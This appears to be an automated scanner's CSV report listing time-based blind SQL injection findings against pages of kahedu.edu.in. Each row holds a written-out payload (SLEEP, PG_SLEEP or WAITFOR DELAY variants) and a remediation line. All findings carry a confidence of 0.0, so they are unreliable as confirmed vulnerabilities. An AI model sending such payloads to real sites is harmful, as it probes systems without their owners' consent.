Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#professional-accounting),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?query=1%22+AND+SLEEP%285%29--#professional-accounting),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?page=1%22+AND+SLEEP%285%29--#professional-accounting),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?cmd=1%22+AND+SLEEP%285%29--#professional-accounting),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?file=1%22+AND+SLEEP%285%29--#professional-accounting),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?search=1%22+AND+SLEEP%285%29--#professional-accounting),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?q=SLEEP%285%29%23#professional-accounting),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?q=1%22+AND+SLEEP%285%29--#professional-accounting),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#professional-accounting),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#professional-accounting),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#professional-accounting),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/?search=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/?q=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/?search=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/?file=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/?cmd=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/?id=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/?q=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/?file=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/?cmd=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/?page=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/?query=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
